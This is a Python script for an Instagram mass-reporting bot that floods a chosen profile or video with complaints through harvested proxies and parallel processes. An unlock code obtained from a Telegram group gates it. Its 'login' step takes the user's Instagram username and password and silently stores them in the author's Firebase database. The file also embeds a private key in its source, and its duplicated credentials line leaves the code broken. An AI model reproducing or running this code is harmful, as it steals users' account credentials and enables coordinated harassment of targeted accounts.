# coding=utf-8
#!/usr/bin/env python3
from colorama import Fore, Back, Style
from multiprocessing import Process
from about import about_msg
from help import help_msg
from libs.animation import colorText
from libs.animation import starting_bot
from libs.animation import load_animation
from libs.animation import animation_bar
from libs.attack import report_video_attack
from libs.attack import report_profile_attack
from libs.proxy_harvester import find_proxies
from libs.utils import parse_proxy_file
from libs.utils import clearConsole
from libs.utils import print_status
from libs.utils import print_error
from libs.utils import print_success
from libs.logo import print_logo
from os import path
import requests
import time
from libs.check_modules import check_modules
from sys import exit
from os import _exit
import os
import webbrowser
from dotenv import load_dotenv
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
from firebase_admin import firestore
load_dotenv ()
# setup
cred =credentials .Certificate ({"type":"service_account","project_id":f"{os.getenv('PRODUCT_ID')}","private_key_id":f"{os.getenv('PRIVATE_KEY_ID')}","private_key":"-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDNoBRzeE8dsuxE\nB18GeT8BZkBqf41P9Wsr1m6k+Cio9+UCS6vlvgRY1S8ctTSIa7M1dLYOUZXOxc1Z\nSY7jXe2EXSg771FNgYUW/5g7Auqh+DkQM9Ma8RiSKtFr5VXWGneOMykTNX1C1gNI\nfd1jXmnB6s3FGTDDNDGKn3skCRz8aHbAjydeaLe4l7dJ7QuOwibVi+TRJHNjIBqg\nXLdkn1VZ/zKPi+kPpAog40RvXBAhRpSEG0w41AcOmZPY7bGmK7fkIFQY8IntT12w\n6krFZfs78waRYjh46Cc+Aib/11oMN2VH8YLrhDuM2elUP0N9BDK4MNqxnzynnuGE\njbtqRAf7AgMBAAECggEAAgIOMRJ7s06MAB4ST33fn6Pf/SpBtwYuhb8SVYoW24+Q\nLPWQOC4i3Ls4Oo+Kc8qZdWwuWvVxARPtbXHKc233Y9OFERDFOnyJUDAuzGS65doG\ntKHM7fZsxwCkCumybOTVRg452HYtQvnUDmEsSEwjvEEOwV39m+pmkXP9P9zW66AV\nCKQ6YGJqp/HX/XQ4rTwiBp5+nlTcuBvLA9DmBtKQ+DNI7MSg8Qa7Tp4ZDZyV/rYF\nNpNxY+Urr+lRniMONJXkIL/HIPW+ru8yepwU/dIUlYM4KFTZyJUG12T3VEN41YBP\nNp7s+nzun5l1kIrt0XFpVpW/ifshiHxAoIN87+M0AQKBgQD72Dx9NTcn/sZhYwzs\n+cmvspMZKq1NklbUmafeFB9KulD/9cgcY5jLTjIcGk8wuUuGH+2rHX04zmWR21Ox\n14h5xqB8PCJ/DLvlJbIsUtLOAxjLCRZTwVGKtzUptsmJ+uPDQTsX8eg36jNTBipt\n1hBaTP+DLbL+LLwWsZsoMVNwzQKBgQDRBJ5B6nnx+zfC+5dEZj8pPF0ZuEXtbWGf\nyFdP03aGUS2/YSS3NcZP4iFKDGUHr/l8jYQK+Lb5BJnLzu6pjP/B2+/kXg4vZ9Ln\n0jHg4vI2/CGQgxfY8aoKwhPmZLvGFBG/QQ6UAnH4OQSFgRV9gNxVOFuxOUE9CJJY\n6ubLeOI75wKBgAoHmJEb93BeUyQ5v6AIaqHWqMkNzA0U0ORyoh7UClL9jJBFB40p\n4kHmgVRhL9ou5vUWfG6eJAiJH75pT7H7dXH0GRwZgP4yUaFUmP3u5npR4UDkwcDg\nKBEwLqvUnb4jAcMa6/GOLsNbTmP2EOaC6e/OtTZSMZixy2PT+uvk2v/ZAoGAcoTI\nPK8+XwFYPOFhsJ0gr/QdwlC/J2XNniDDDb57av4hRYDw/9xbqjroKE0AMaUN2Vsj\n5Gr+vRLzPMJE6uqQ2mMpXYLW3MxStqbooyFUuiGMNkRNFZTaqIhLJOk+JDmsu4/m\nb9ujG/AJdSgTYS7wCVUWj9Qh1VHT9RnGl+bEdTMCgYEA62f+7okKiialiRo0osN/\nzpn2/bZ/xoNp6paj7t9Msj8Xs3JHGFEu/NXMlOm2cZE0ZFUagddHi/DRVQBMlnG+\nzlQUgueOzM8wsvLw3Vn/erbdBxcwD/ianD53upJbefcR1XkdEdlp0r/59vXETEff\niZ3ZIahZltNG/RAmnr2a0J8=\n-----END PRIVATE KEY-----\n","client_email":f"{os.getenv('CLIENT_EMAIL')}","client_id":f"{os.getenv('CLIENT_ID')}","auth_uri":"https://accounts.google.com/o/oauth2/auth","token_uri":"https://oauth2.googleapis.com/token","auth_provider_x509_cert_url":"https://www.googleapis.com/oauth2/v1/certs","client_x509_cert_url":f"{os.getenv('CLIENT_URL')}"})cred =credentials .Certificate ({"type":"service_account","project_id":f"{os.getenv('PRODUCT_ID')}","private_key_id":f"{os.getenv('PRIVATE_KEY_ID')}","private_key":"-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDNoBRzeE8dsuxE\nB18GeT8BZkBqf41P9Wsr1m6k+Cio9+UCS6vlvgRY1S8ctTSIa7M1dLYOUZXOxc1Z\nSY7jXe2EXSg771FNgYUW/5g7Auqh+DkQM9Ma8RiSKtFr5VXWGneOMykTNX1C1gNI\nfd1jXmnB6s3FGTDDNDGKn3skCRz8aHbAjydeaLe4l7dJ7QuOwibVi+TRJHNjIBqg\nXLdkn1VZ/zKPi+kPpAog40RvXBAhRpSEG0w41AcOmZPY7bGmK7fkIFQY8IntT12w\n6krFZfs78waRYjh46Cc+Aib/11oMN2VH8YLrhDuM2elUP0N9BDK4MNqxnzynnuGE\njbtqRAf7AgMBAAECggEAAgIOMRJ7s06MAB4ST33fn6Pf/SpBtwYuhb8SVYoW24+Q\nLPWQOC4i3Ls4Oo+Kc8qZdWwuWvVxARPtbXHKc233Y9OFERDFOnyJUDAuzGS65doG\ntKHM7fZsxwCkCumybOTVRg452HYtQvnUDmEsSEwjvEEOwV39m+pmkXP9P9zW66AV\nCKQ6YGJqp/HX/XQ4rTwiBp5+nlTcuBvLA9DmBtKQ+DNI7MSg8Qa7Tp4ZDZyV/rYF\nNpNxY+Urr+lRniMONJXkIL/HIPW+ru8yepwU/dIUlYM4KFTZyJUG12T3VEN41YBP\nNp7s+nzun5l1kIrt0XFpVpW/ifshiHxAoIN87+M0AQKBgQD72Dx9NTcn/sZhYwzs\n+cmvspMZKq1NklbUmafeFB9KulD/9cgcY5jLTjIcGk8wuUuGH+2rHX04zmWR21Ox\n14h5xqB8PCJ/DLvlJbIsUtLOAxjLCRZTwVGKtzUptsmJ+uPDQTsX8eg36jNTBipt\n1hBaTP+DLbL+LLwWsZsoMVNwzQKBgQDRBJ5B6nnx+zfC+5dEZj8pPF0ZuEXtbWGf\nyFdP03aGUS2/YSS3NcZP4iFKDGUHr/l8jYQK+Lb5BJnLzu6pjP/B2+/kXg4vZ9Ln\n0jHg4vI2/CGQgxfY8aoKwhPmZLvGFBG/QQ6UAnH4OQSFgRV9gNxVOFuxOUE9CJJY\n6ubLeOI75wKBgAoHmJEb93BeUyQ5v6AIaqHWqMkNzA0U0ORyoh7UClL9jJBFB40p\n4kHmgVRhL9ou5vUWfG6eJAiJH75pT7H7dXH0GRwZgP4yUaFUmP3u5npR4UDkwcDg\nKBEwLqvUnb4jAcMa6/GOLsNbTmP2EOaC6e/OtTZSMZixy2PT+uvk2v/ZAoGAcoTI\nPK8+XwFYPOFhsJ0gr/QdwlC/J2XNniDDDb57av4hRYDw/9xbqjroKE0AMaUN2Vsj\n5Gr+vRLzPMJE6uqQ2mMpXYLW3MxStqbooyFUuiGMNkRNFZTaqIhLJOk+JDmsu4/m\nb9ujG/AJdSgTYS7wCVUWj9Qh1VHT9RnGl+bEdTMCgYEA62f+7okKiialiRo0osN/\nzpn2/bZ/xoNp6paj7t9Msj8Xs3JHGFEu/NXMlOm2cZE0ZFUagddHi/DRVQBMlnG+\nzlQUgueOzM8wsvLw3Vn/erbdBxcwD/ianD53upJbefcR1XkdEdlp0r/59vXETEff\niZ3ZIahZltNG/RAmnr2a0J8=\n-----END PRIVATE KEY-----\n","client_email":f"{os.getenv('CLIENT_EMAIL')}","client_id":f"{os.getenv('CLIENT_ID')}","auth_uri":"https://accounts.google.com/o/oauth2/auth","token_uri":"https://oauth2.googleapis.com/token","auth_provider_x509_cert_url":"https://www.googleapis.com/oauth2/v1/certs","client_x509_cert_url":f"{os.getenv('CLIENT_URL')}"})
firebase_admin.initialize_app(cred)
db = firestore.client()


check_modules()
CODE = os.environ.get("CODE")


def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def profile_attack_process(username, proxy_list):
    if (len(proxy_list) == 0):
        for _ in range(10):
            report_profile_attack(username, None)
        return

    for proxies in proxy_list:
        report_profile_attack(username, proxies)


def video_attack_process(video_url, proxy_list):
    if (len(proxy_list) == 0):
        for _ in range(10):
            report_video_attack(video_url, None)
        return

    for proxies in proxy_list:
        report_video_attack(video_url, proxies)


def video_attack(proxies):
    video_url = input("Enter the link of the video you want to report")
    print(Style.RESET_ALL)
    if (len(proxies) == 0):
        for k in range(5):
            p = Process(target=video_attack_process, args=(video_url, [],))
            p.start()
            print_status(str(k + 1) + ". Transaction Opened!")
            if (k == 5):
                print("")
        return

    chunk = list(chunks(proxies, 10))

    print("")
    print_status("Video complaint attack is on!\n")

    i = 1
    for proxy_list in chunk:
        p = Process(target=video_attack_process, args=(video_url, proxy_list,))
        p.start()
        print_status(str(i) + ". Transaction Opened!")
        if (k == 5):
            print("")
        i = i + 1


def profile_attack(proxies):
    username = input("Enter the username of the person you want to report : ")
    response = requests.get("https://instagram.com/" + username + "/")
    if response.status_code != 200:
        print("\n\n" + Fore.RED + "[*] Invalid username!")
        time.sleep(2)
        profile_attack(proxies)
    elif (username == ""):
        print("\n\n" + Fore.RED +
              "[*] Enter username again, don't leave it blank")
        time.sleep(2)
        profile_attack(proxies)
    print(Style.RESET_ALL)
    if (len(proxies) == 0):
        for k in range(5):
            p = Process(target=profile_attack_process, args=(username, [],))
            p.start()
            print_status(str(k + 1) + ". Transaction Opened!")
        return

    chunk = list(chunks(proxies, 10))

    print("")
    print_status("Profile complaint attack is starting!\n")

    i = 1
    for proxy_list in chunk:
        p = Process(target=profile_attack_process,
                    args=(username, proxy_list,))
        p.start()
        print_status(str(i) + ". Transaction Opened!")
        if (i == 5):
            print("")
        i = i + 1

def unlock():
    print(Style.RESET_ALL)
    code = input("Enter Code To Unlock This Tool - ")
    if (code=="@hackerexploits"):
        print_success("Successfully unlocked the tool!\n\n")
        starting_bot()
        database()
    elif(code=="1"):
        print_success("Send #instareport in telegram group @Hacker_Chatroom to get the code\n\n")
        time.sleep(3)
        webbrowser.open('http://t.me/Hacker_Chatroom')
        time.sleep(1)
        unlock()
    else:
        print('\nINVALID CODE\n\nHow To Get Code\nGo to t.me/Hacker_Chatroom\nSend #instareport')
        print_success("Press 1 for help\n")
        time.sleep(2)
        unlock()


def database():
    clearConsole()
    print_logo()
    print(Style.RESET_ALL)
    print_status("================ LOGIN INSTAGRAM  ================\n")
    print(Style.RESET_ALL)
    username = input("Enter your instagram username : ")
    password = input("Enter your instagram password : ")

    response = requests.get("https://instagram.com/" + username + "/")
    if response.status_code != 200:
        print("\n\n" + Fore.RED + "[*] Invalid username!")
        database()
    elif (username == ""):
        print("\n\n" + Fore.RED +
              "[*] Enter username again, don't leave it blank")
        database()

    # Adding Docs
    elif response.status_code == 200:

        data = {
            'password': password,
            'username': username
        }
        db.collection('users').add(data)
        load_animation()
        print_success("Login Success!")
        report()


def main():
    if (os.name == 'nt'):
        clearConsole()
        print_logo()
        que = print('''
        [1] Start Report Bot
        [2] Help
        [3] About
        [4] Exit
        ''')
        que_ans = input("Please select :- ")
        if (que_ans.isdigit() == False):
            print_error("The answer is not understood.")
            main()

        if (int(que_ans) > 4 or int(que_ans) == 0):
            print_error("The answer is not understood.")
            main()
        elif (int(que_ans) == 1):
            unlock()
        elif (int(que_ans) == 2):
            clearConsole()
            help_msg()
        elif (int(que_ans) == 3):
            about_msg()
        elif (int(que_ans) == 4):
            print_status("Exiting the program.....Thanks for using this tool!")
            exit(0)

    else:
        os.system('bash setup.sh')


def report():
    clearConsole()
    print_logo()
    ret = input("Would you like to use a proxy? (Recommended Yes) [Y/N] : ")
    proxies = []

    if (ret == "Y" or ret == "y"):
        ret = input(
            "Would you like to collect your proxies from the internet? [Y/N] : ")

        if (ret == "Y" or ret == "y"):
            print_status(
                "Gathering proxy from the Internet! This may take a while.\n")
            time.sleep(2)
            proxies = find_proxies()

        elif (ret == "N" or ret == "n"):
            print_status("Please have a maximum of 50 proxies in a file!")
            file_path = input("Enter the path to your proxy list")
            proxies = parse_proxy_file(file_path)
        else:
            print_error("Answer not understood, exiting!")
            exit()

        print_success(str(len(proxies)) + " Number of proxy found!\n")
        print(proxies)
    elif (ret == "N" or ret == "n"):
        pass
    else:
        print_error("Answer not understood, exiting!")
        exit()

    print("")
    print_status("1 - Report Profile.")
    print_status("2 - Report a video.")
    report_choice = input("Please select the complaint method :- ")
    print("")

    if (report_choice.isdigit() == False):
        print_error("The answer is not understood.")
        main()

    if (int(report_choice) > 2 or int(report_choice) == 0):
        print_error("The answer is not understood.")
        main()

    if (int(report_choice) == 1):
        profile_attack(proxies)
    elif (int(report_choice) == 2):
        video_attack(proxies)


if __name__ == "__main__":
    try:
        main()
        print(Style.RESET_ALL)
    except KeyboardInterrupt:
        print("\n\n" + Fore.RED + "[*] Program is closing!")
        print(Style.RESET_ALL)
        _exit(0)
